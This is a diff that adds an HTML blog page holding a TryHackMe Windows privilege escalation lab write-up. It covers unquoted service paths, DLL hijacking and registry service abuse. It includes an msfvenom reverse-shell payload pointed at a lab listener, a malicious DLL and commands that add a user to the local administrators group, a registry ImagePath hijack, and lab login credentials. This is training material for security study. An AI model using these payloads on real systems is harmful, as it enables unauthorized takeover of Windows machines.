@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Windows-PrivEsc-Arena TryHackMe writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/windows-machines/2022-04-26-windowsprivescarena/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Windows-PrivEsc-Arena TryHackMe writeup">
+  <meta property="og:description" content="During studying the TCM windows privilege escalation course this is the Lab designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-04-26T00:52:13+02:00">
+    <meta property="article:modified_time" content="2022-04-26T00:52:13+02:00">
+    <meta property="article:tag" content="TryHackme">
+    <meta property="article:tag" content="Windows-Privesc">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Windows-PrivEsc-Arena TryHackMe writeup">
+  <meta name="twitter:description" content="During studying the TCM windows privilege escalation course this is the Lab designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/windows-machines/2022-04-26-windowsprivescarena/" /><link rel="prev" href="http://example.org/posts/linux-machines/2022-01-21-backdoor/" /><link rel="next" href="http://example.org/posts/web-exploitation/2022-05-02-hacker-ts/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Windows-PrivEsc-Arena TryHackMe writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/windows-machines\/2022-04-26-windowsprivescarena\/"
+        },"genre": "posts","keywords": "TryHackme, windows-privesc","wordcount":  1611 ,
+        "url": "http:\/\/example.org\/posts\/windows-machines\/2022-04-26-windowsprivescarena\/","datePublished": "2022-04-26T00:52:13+02:00","dateModified": "2022-04-26T00:52:13+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Windows-PrivEsc-Arena TryHackMe writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/windows-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-04-26">2022-04-26</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1611 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#service-escalation---unquoted-service-paths">Service-Escalation - Unquoted Service Paths</a></li>
+    <li><a href="#service-escalation---dll-hijacking">Service Escalation - DLL Hijacking</a></li>
+    <li><a href="#service-escalation---registry">Service Escalation - Registry</a></li>
+    <li><a href="#service-escalation---executable-files">Service Escalation - Executable Files</a></li>
+    <li><a href="#service-escalation---binpath">Service Escalation - binPath</a></li>
+    <li><a href="#potato-escalation---hot-potato">Potato Escalation - Hot Potato</a></li>
+    <li><a href="#registry-escalation---autorun">Registry Escalation - Autorun</a></li>
+    <li><a href="#registry-escalation---alwaysinstallelevated">Registry Escalation - AlwaysInstallElevated</a></li>
+    <li><a href="#privilege-escalation---startup-applications">Privilege Escalation - Startup Applications</a></li>
+    <li><a href="#password-mining-escalation---memory">Password Mining Escalation - Memory</a></li>
+    <li><a href="#privilege-escalation---kernel-exploits">Privilege Escalation - Kernel Exploits</a></li>
+    <li><a href="#automation">Automation</a></li>
+    <li><a href="#quick-commands">Quick commands</a>
+      <ul>
+        <li><a href="#useful-resources-">Useful Resources :</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>During studying the <a href="https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners" target="_blank" rel="noopener noreffer ">TCM windows privilege escalation course</a> this is the <a href="https://tryhackme.com/room/windowsprivescarena" target="_blank" rel="noopener noreffer ">Lab</a> designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist</p>
+<p>this room covers :</p>
+<ul>
+<li><a href="#service-escalation---unquoted-service-paths" rel="">Service Escalation - Unquoted Service Paths</a></li>
+<li><a href="#service-escalation---dll-hijacking" rel="">Service Escalation - DLL Hijacking</a></li>
+<li><a href="#service-escalation---registry" rel="">Service Escalation - Registry</a></li>
+<li><a href="#service-escalation---executable-files" rel="">Service Escalation - Executable Files</a></li>
+<li><a href="#service-escalation---binpath" rel="">Service Escalation - binPath</a></li>
+<li><a href="#potato-escalation---hot-potato" rel="">Potato Escalation - Hot Potato</a></li>
+<li><a href="#registry-escalation---autorun" rel="">Registry Escalation - Autorun</a></li>
+<li><a href="#registry-escalation---alwaysinstallelevated" rel="">Registry Escalation - AlwaysInstallElevated</a></li>
+<li><a href="#privilege-escalation---startup-applications" rel="">Privilege Escalation - Startup Applications</a></li>
+<li><a href="#password-mining-escalation---memory" rel="">Password Mining Escalation - Memory</a></li>
+<li><a href="#privilege-escalation---kernel-exploits" rel="">Privilege Escalation - Kernel Exploits</a></li>
+<li><a href="#quick-commands" rel="">quick commands</a></li>
+</ul>
+<hr>
+<ul>
+<li>
+<p>first you need to connect to THM with the openvpn as mentioned in task-1 , let&rsquo;s drive into the Room itself.</p>
+</li>
+<li>
+<p>As the room is discussing privilege escalation so it assumes you have compromised a windows machine in any way and you are now against the privesc step , that&rsquo;s why you are given the RDP connection directly.</p>
+</li>
+<li>
+<p>connect with RDP :</p>
+</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">rdesktop</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">235</span> <span class="n">-u</span> <span class="n">user</span> <span class="n">-p</span> <span class="n">password321</span></span></span></code></pre></div></div>
+<h2 id="service-escalation---unquoted-service-paths">Service-Escalation - Unquoted Service Paths</h2>
+<ul>
+<li>Unquoted path escalation is the case when a service path is like :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Program</span> <span class="n">Files</span><span class="p">\</span><span class="n">example</span> <span class="mf">2</span><span class="p">\</span><span class="n">app</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
+<ul>
+<li>what happens to run the app.exe is as following:</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code># Try :
+C:\Program.exe
+# if not found try :
+C:\Program Files\example.exe
+# if not found try :
+C:\Program Files\example 2\app.exe</code></pre></div>
+<ul>
+<li>so if we have write access to the <code>C:\program Files\</code> we can place our <code>example.exe</code> so it can be used instead of the actual <code>app.exe</code> , and we can place a malicious app that can get us a reverse connection</li>
+<li>the mitigation is quite straight forward : <code>&quot;C:\Program Files\example 2\app.exe&quot;</code></li>
+<li>Attack example :</li>
+<li>first you need to list the services along with the path :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-WmiObject</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">State</span><span class="p">,</span> <span class="n">PathName</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426022212.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426022212.png, /assets/images/windowsprivescarena/20220426022212.png 1.5x, /assets/images/windowsprivescarena/20220426022212.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426022212.png"
+        title="image" /></p>
+<ul>
+<li>to <strong>query the configuration information for a specified service</strong> we use :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">qc</span> <span class="n">unqoutedsvc</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426022509.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426022509.png, /assets/images/windowsprivescarena/20220426022509.png 1.5x, /assets/images/windowsprivescarena/20220426022509.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426022509.png"
+        title="image" /></p>
+<ul>
+<li>now as we can see under the <code>BINARY_PATH</code> it is not quoted so we can try our luck there</li>
+<li>use <code>accesschk64.exe</code> to check our permissions for that path</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426022820.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426022820.png, /assets/images/windowsprivescarena/20220426022820.png 1.5x, /assets/images/windowsprivescarena/20220426022820.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426022820.png"
+        title="image" /></p>
+<ul>
+<li>we can write into the path the following : <code>C:\Program\Unquoted path service\common.exe</code></li>
+<li>so let&rsquo;s generate the payload with msfvenom and send it to that path , then start the service</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.9.0.37 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f exe -o  common.exe</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426023424.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426023424.png, /assets/images/windowsprivescarena/20220426023424.png 1.5x, /assets/images/windowsprivescarena/20220426023424.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426023424.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426023436.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426023436.png, /assets/images/windowsprivescarena/20220426023436.png 1.5x, /assets/images/windowsprivescarena/20220426023436.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426023436.png"
+        title="image" /></p>
+<ul>
+<li>note that when the last sc command halts then terminated you will lose your connection so it is better to make a better than a reverse connection like adding a user to the administrator group instead :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">msfvenom</span> <span class="n">-p</span> <span class="n">windows</span><span class="p">/</span><span class="n">exec</span> <span class="n">CMD</span><span class="p">=</span><span class="s1">&#39;net localgroup administrators user /add&#39;</span> <span class="o">-f</span> <span class="nb">exe-service</span> <span class="n">-o</span> <span class="n">common</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220426023931.png"
+        data-srcset="/assets/images/windowsprivescarena/20220426023931.png, /assets/images/windowsprivescarena/20220426023931.png 1.5x, /assets/images/windowsprivescarena/20220426023931.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220426023931.png"
+        title="image" /></p>
+<h2 id="service-escalation---dll-hijacking">Service Escalation - DLL Hijacking</h2>
+<ul>
+<li>My favorite escalation way , DLL Hijacking is very common escalation Factor you should consider,it is a little tricky to detect But easy to abuse.</li>
+<li>attackers usually copy the suspected executables and run them at their lab to analyze them</li>
+<li>in this lab we are working in same machine , you need <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon" target="_blank" rel="noopener noreffer ">Process Monitor</a> it is like <code>pspy</code> in linux But it tells us details about a process as we will see</li>
+<li>the idea behind DLL Hijacking is : finding a process searches for a DLL and not able to find it</li>
+<li>if we the attacker can write to the path , the process searches through , we can craft our own malicious DLL to perform administrative actions</li>
+<li>add the filters :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425055638.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425055638.png, /assets/images/windowsprivescarena/20220425055638.png 1.5x, /assets/images/windowsprivescarena/20220425055638.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425055638.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425055742.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425055742.png, /assets/images/windowsprivescarena/20220425055742.png 1.5x, /assets/images/windowsprivescarena/20220425055742.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425055742.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425060520.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425060520.png, /assets/images/windowsprivescarena/20220425060520.png 1.5x, /assets/images/windowsprivescarena/20220425060520.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425060520.png"
+        title="image" /></p>
+<ul>
+<li>focusing on this <code>dllhijackservice</code> to understand how it searches for dlls :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425060621.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425060621.png, /assets/images/windowsprivescarena/20220425060621.png 1.5x, /assets/images/windowsprivescarena/20220425060621.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425060621.png"
+        title="image" /></p>
+<ul>
+<li>it searches for a dll under <code> C:\Temp</code> which we have access to write</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425060723.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425060723.png, /assets/images/windowsprivescarena/20220425060723.png 1.5x, /assets/images/windowsprivescarena/20220425060723.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425060723.png"
+        title="image" /></p>
+<ul>
+<li>we craft our payload then place it in the <code>C:\Temp:\hijackme.dll</code> then start the service , the next time it starts it will find the missed dll and execute it</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">#include &lt;windows.h&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="n">DllMain</span> <span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="p">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="n">system</span><span class="p">(</span><span class="s2">&#34;cmd.exe /k net localgroup administrators user /add&#34;</span><span class="p">);</span>  <span class="p">//</span><span class="n">replace</span> <span class="n">command</span>
+</span></span><span class="line"><span class="cl"><span class="n">ExitProcess</span><span class="p">(</span><span class="mf">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<ul>
+<li>compile it as dll :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">x86_64-w64</span><span class="n">-mingw32-gcc</span>  <span class="n">dll</span><span class="p">.</span><span class="py">c</span> <span class="n">-shared</span> <span class="n">-o</span> <span class="n">hijackme</span><span class="p">.</span><span class="n">dll</span></span></span></code></pre></div></div>
+<ul>
+<li>move it and restart the service :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425062428.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425062428.png, /assets/images/windowsprivescarena/20220425062428.png 1.5x, /assets/images/windowsprivescarena/20220425062428.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425062428.png"
+        title="image" /></p>
+<ul>
+<li>the user has been added to the local administrators group</li>
+</ul>
+<h2 id="service-escalation---registry">Service Escalation - Registry</h2>
+<ul>
+<li>List them :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query HKLM\SYSTEM\CurrentControlSet\Services</span></span></code></pre></div></div>
+<ul>
+<li>search for a service has <code>NT AUTHORITY\INTERACTIVE allow FullControl</code> :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\regsvc <span class="p">|</span> fl</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425043012.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425043012.png, /assets/images/windowsprivescarena/20220425043012.png 1.5x, /assets/images/windowsprivescarena/20220425043012.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425043012.png"
+        title="image" /></p>
+<ul>
+<li>use the code <a href="https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c" target="_blank" rel="noopener noreffer ">here</a></li>
+<li>add what ever code you want to execute for example add current user to the administrator group</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-cmd">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">cmd.exe /k net localgroup administrators user /add</span></span></code></pre></div></div>
+<ul>
+<li>cross compile it :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">i686-w64</span><span class="n">-mingw32-gcc</span> <span class="n">windows_service</span><span class="p">.</span><span class="py">c</span> <span class="n">-o</span> <span class="n">fake</span><span class="p">.</span><span class="n">exe</span></span></span></code></pre></div></div>
+<ul>
+<li>send it to the windows then :</li>
+</ul>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">services</span><span class="p">\</span><span class="n">regsvc</span> <span class="p">/</span><span class="n">v</span> <span class="n">ImagePath</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_EXPAND_SZ</span> <span class="p">/</span><span class="n">d</span> <span class="n">c:</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">fake</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">f</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425050400.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425050400.png, /assets/images/windowsprivescarena/20220425050400.png 1.5x, /assets/images/windowsprivescarena/20220425050400.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/windowsprivescarena/20220425050400.png"
+        title="image" /></p>
+<ul>
+<li>and we can see the user has been added to the local administrator group, trying to perform an administrative action the ACL will accept our password to grantee this action :</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/windowsprivescarena/20220425050748.png"
+        data-srcset="/assets/images/windowsprivescarena/20220425050748.png, /assets/images/windowsprivescarena/20220425050748.png 1.5x, /assets/images/windowsprivescarena/20220425050748.png 2x"
+        data-sizes="auto"
